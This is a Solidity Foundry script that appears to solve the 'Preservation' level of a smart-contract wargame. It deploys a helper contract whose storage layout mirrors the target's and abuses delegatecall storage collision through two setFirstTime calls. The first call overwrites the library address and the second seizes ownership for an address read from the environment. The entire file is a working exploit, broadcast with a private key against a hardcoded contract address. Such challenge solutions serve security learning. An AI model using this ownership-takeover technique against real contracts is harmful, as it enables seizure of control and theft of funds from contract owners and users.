// SPDX_License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/16_Preservation.sol";

contract Helper {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract POC is Script {
    Preservation public target;
    Helper public helper;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Preservation(0xD8fa22C49CB67465bA4f0d6fA9e3FA2Bf8a08e51);
        helper = new Helper();

        address owner = target.owner();
        console.log("before owner: ", owner);

        target.setFirstTime(uint256(uint160(address(helper))));
        target.setFirstTime(uint256(uint160(address(vm.envAddress("MY_ADDRESS")))));

        owner = target.owner();
        console.log("after  owner: ", owner);

        vm.stopBroadcast();
    }
}